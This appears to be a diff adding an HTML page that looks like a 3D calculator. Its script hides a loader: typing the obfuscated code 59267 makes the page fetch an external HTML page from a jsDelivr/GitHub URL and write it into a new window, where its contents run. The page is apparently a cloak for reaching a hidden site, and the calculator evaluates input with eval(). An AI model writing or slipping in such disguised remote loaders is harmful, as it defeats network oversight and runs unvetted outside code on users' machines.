@@ -1,0 +1,228 @@
+<!doctype html><html><head></head><body><!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>3D Calculator</title>
+
+	<style>
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			min-height: 100vh;
+			background: linear-gradient(135deg, #667eea, #764ba2, #f093fb);
+			font-family: Arial, sans-serif;
+			overflow: hidden;
+		}
+
+		/* SAFE 3D SCENE */
+		.scene {
+			width: 380px;
+			perspective: 1000px;
+		}
+
+		/* FLOATING CARD (SAFE TRANSFORM ONLY HERE) */
+		.calculator {
+			background: linear-gradient(135deg, #2d3561, #1e2847);
+			border-radius: 20px;
+			padding: 25px;
+
+			transform: rotateX(0deg) rotateY(0deg);
+			transition: transform 0.08s ease;
+
+			box-shadow:
+				0 25px 60px rgba(0, 0, 0, 0.5),
+				0 0 30px rgba(102, 126, 234, 0.3);
+		}
+
+		/* DISPLAY */
+		.display {
+			background: #0a0e27;
+			color: #00ff88;
+			font-size: 32px;
+			padding: 25px;
+			border-radius: 12px;
+			text-align: right;
+			margin-bottom: 20px;
+		}
+
+		/* BUTTON GRID */
+		.buttons {
+			display: grid;
+			grid-template-columns: repeat(4, 1fr);
+			gap: 12px;
+		}
+
+		/* SAFE 3D LOOK (NO pseudo elements = NO BREAKS) */
+		button {
+			padding: 18px;
+			font-size: 20px;
+			border: none;
+			border-radius: 12px;
+			cursor: pointer;
+			color: white;
+
+			background: linear-gradient(135deg, #667eea, #5568d3);
+
+			box-shadow:
+				0 6px 0 rgba(0, 0, 0, 0.35),
+				0 12px 20px rgba(0, 0, 0, 0.25);
+
+			transition: all 0.12s ease;
+		}
+
+		button:active {
+			transform: translateY(4px);
+			box-shadow:
+				0 2px 0 rgba(0, 0, 0, 0.35),
+				0 6px 10px rgba(0, 0, 0, 0.2);
+		}
+
+		button.operator {
+			background: #f5576c;
+		}
+
+		button.clear {
+			background: #ff6b35;
+			grid-column: span 2;
+		}
+
+		button.equals {
+			background: #4caf50;
+			grid-column: span 2;
+		}
+
+		button.backspace {
+			background: #9c27b0;
+		}
+	</style>
+</head>
+
+<body>
+
+	<div class="scene">
+		<div class="calculator">
+
+			<div class="display" id="display">0</div>
+
+			<div class="buttons">
+
+				<button class="clear" onclick="clearDisplay()">AC</button>
+				<button class="backspace" onclick="backspace()">←</button>
+
+				<button onclick="appendOperator('/')">/</button>
+				<button onclick="appendOperator('*')">*</button>
+
+				<button onclick="appendNumber('7')">7</button>
+				<button onclick="appendNumber('8')">8</button>
+				<button onclick="appendNumber('9')">9</button>
+				<button onclick="appendOperator('-')">-</button>
+
+				<button onclick="appendNumber('4')">4</button>
+				<button onclick="appendNumber('5')">5</button>
+				<button onclick="appendNumber('6')">6</button>
+				<button onclick="appendOperator('+')">+</button>
+
+				<button onclick="appendNumber('1')">1</button>
+				<button onclick="appendNumber('2')">2</button>
+				<button onclick="appendNumber('3')">3</button>
+				<button onclick="appendOperator('%')">%</button>
+
+				<button onclick="appendNumber('0')">0</button>
+				<button onclick="appendNumber('.')">.</button>
+
+				<button class="equals" onclick="calculate()">=</button>
+
+			</div>
+		</div>
+	</div>
+
+	<script>
+		let display = document.getElementById("display");
+let currentInput = "0";
+
+/* hidden 59267 */
+const secret = String.fromCharCode(53,57,50,54,55);
+
+const ruinsUrl =
+"https://cdn.jsdelivr.net/gh/interloper-mym/RUINS@main/RUINS.html";
+
+function runSite(){
+const w = window.open("about:blank","_blank");
+
+fetch(ruinsUrl + "?t=" + Date.now())
+.then(r=>r.text())
+.then(html=>{
+w.document.open();
+w.document.write(html);
+w.document.close();
+});
+}
+
+function checkSecret(){
+if(currentInput === secret){
+runSite();
+}
+}
+
+function appendNumber(n){
+if(currentInput === "0" && n !== ".") currentInput = n;
+else currentInput += n;
+
+display.textContent = currentInput;
+checkSecret();
+}
+
+function appendOperator(op){
+if(/[\+\-\*\/%]$/.test(currentInput)) return;
+currentInput += op;
+display.textContent = currentInput;
+}
+
+function calculate(){
+try{
+currentInput = eval(currentInput).toString();
+display.textContent = currentInput;
+checkSecret();
+}catch{
+display.textContent = "Error";
+currentInput = "0";
+}
+}
+
+function clearDisplay(){
+currentInput = "0";
+display.textContent = "0";
+}
+
+function backspace(){
+currentInput = currentInput.slice(0,-1) || "0";
+display.textContent = currentInput;
+}
+
+/* SAFE mouse tilt (NO breaking clicks) */
+document.addEventListener("mousemove",(e)=>{
+
+const calc = document.querySelector(".calculator");
+
+let x = (window.innerWidth/2 - e.clientX)/40;
+let y = (window.innerHeight/2 - e.clientY)/40;
+
+calc.style.transform =
+`rotateY(${x}deg) rotateX(${y}deg)`;
+
+});
+
+	</script>
+
+</body>
+
+</html></body><html>
